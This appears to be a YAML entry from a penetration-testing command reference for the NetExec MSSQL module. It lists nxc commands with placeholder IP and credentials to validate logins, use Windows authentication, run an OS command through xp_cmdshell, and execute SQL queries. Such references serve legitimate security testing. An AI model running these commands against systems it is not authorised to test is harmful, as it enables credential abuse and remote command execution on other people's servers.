---
description: |
  NetExec MSSQL module — authenticate, execute queries,
  and enable xp_cmdshell for OS command execution.

  Reference values:
    Target IP: 10.10.10.1
    Username: pentuser
    Password: P@ssw0rd123
command: |
  # Check credentials
  nxc mssql 10.10.10.1 -u pentuser -p 'P@ssw0rd123'

  # Windows auth
  nxc mssql 10.10.10.1 -u pentuser -p 'P@ssw0rd123' -d test.local

  # Execute OS command
  nxc mssql 10.10.10.1 -u pentuser -p 'P@ssw0rd123' -x "whoami"

  # Execute SQL query
  nxc mssql 10.10.10.1 -u pentuser -p 'P@ssw0rd123' -q "SELECT @@version"
phase:
  - Enumeration
  - Exploitation
target_os:
  - Windows
services:
  - MSSQL
items:
  - Username
  - Password
techniques: []
network_position:
  - Internal
references:
  - https://github.com/Pennyw0rth/NetExec
---
